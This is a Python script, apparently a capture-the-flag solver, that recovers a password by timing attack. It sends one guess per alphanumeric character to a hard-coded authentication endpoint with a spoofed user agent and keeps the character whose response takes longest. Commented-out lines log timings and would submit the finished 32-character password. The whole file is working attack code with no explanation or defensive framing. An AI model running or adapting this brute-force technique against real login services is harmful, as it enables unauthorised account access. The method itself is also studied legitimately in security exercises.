import requests
import string

strings1 =  "abcdefghijklmnopqrstuvwxyz0123456789"
largest = 0
largest_char = ''
known_pass = []
prev_char = ''
prev_time = 0
arr=[]
# if len(known_pass)==32:
# 	print('done')
# 	print(''.join(known_pass))
# 	r = requests.post("http://3d375032374147a7865753e4bbc92682.xyz:8070/auth/v2", data={'Seed':'b60c6fb49ff14e57a2661bea4641376d','Password':''.join(known_pass)},
# 	headers={'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b', 'content-type' : 'application/json; charset=utf-8' })
payload ={}
for c in range(len(strings1)):#string.printable:
	payload = {'Seed':"b60c6fb49ff14e57a2661bea4641376d",'Password':"44d4129a07fd4be0b06e44f528f1f531"+strings1[c]}
	Url = "http://35.246.158.51:8070/auth/v1_1"
	#according to the server code i needed this particular user agent in order to execute my burteforce
	hdrs={'User-Agent':'ed9ae2c0-9b15-4556-a393-23d500675d4b','content-type':'application/json; charset=utf-8' }
	r = requests.post(url= Url, json=payload,headers= hdrs)
	#known_pass.pop()
	z = r.json()
	#cur_time = r.elapsed.total_seconds()
	print(strings1[c],z['Time'],z['IsValid'],z['LockURL'])#,cur_time)
	#arr.append([c,cur_time])
		# if cur_time - prev_time>=0.03:
		# 	with open("loger.txt","a") as f:
		# 		f.write(c)
		# 		f.write("   ")
		# 		f.write(str(cur_time))
		# 		f.write("\n")
	#prev_char = c
	#prev_time = cur_time
	if largest<z['Time'] :#and z['Time']<0.5:
		largest = z['Time']
		largest_char= strings1[c]
		# with open("log.txt","a") as f:
		# 	f.write(c)
		# 	f.write("   ")
		# 	f.write(str(cur_time))
		# 	f.write("\n")
print(largest_char,largest)
known_pass.append(largest_char)
print(known_pass,largest)
# sum = 0
# for i in arr:
# 	sum+=i[1]
# sum = sum/90
# for t in arr:
# 	if t[1]>= sum+0.03:
# 		print(t)
